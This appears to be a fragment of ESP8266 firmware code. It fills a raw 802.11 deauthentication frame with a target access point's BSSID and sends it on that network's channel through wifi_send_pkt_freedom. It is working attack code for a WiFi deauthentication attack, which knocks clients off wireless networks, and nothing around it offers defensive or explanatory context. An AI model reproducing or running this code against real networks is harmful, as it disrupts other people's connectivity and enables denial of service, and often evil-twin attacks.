uint8_t* createPacket(uint8_t* frame, uint8_t *bssid) {
  for (int i = 0; i < 6; i++) {
    frame[10 + i] = frame[16 + i] = bssid[i];
  }
  return frame;
}
void sendDeauth(uint8_t* frame, int id) {
  wifi_set_channel(WiFi.channel(id));
  wifi_send_pkt_freedom(frame, 26, 0);
}
